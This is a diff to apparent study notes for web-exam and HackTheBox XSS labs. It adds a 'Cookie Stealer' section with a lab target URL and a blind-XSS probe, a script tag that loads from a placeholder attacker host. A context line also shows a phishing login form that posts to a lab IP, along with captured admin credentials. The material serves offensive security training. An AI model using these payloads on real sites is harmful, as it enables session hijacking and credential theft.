@@ -109,3 +109,22 @@ document.write('<h3>Please login to continue</h3><form action=http://10.10.15.41
 username=admin&password=p1zd0nt57341myp455
 ```
 
+## Cookie Stealer  
+
+>BSCP Study notes contain many examples of [cookie stealer payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#dom-based-xss)  
+
+>[Session Hijacking](https://academy.hackthebox.com/module/103/section/1008) aka Cookie Stealer attacks.  
+
+>Target URL: `http://10.129.63.83/hijacking/`  
+
+![cookie-stealer-register](/images/cookie-stealer-register.png)  
+
+>Target response message read, `An Admin will review your registration request.`.  
+
+>Identify vulnerable input field with sample javascript payload: `<script src="http://OUR_IP/username"></script>`  
+
+
+
+
+
+
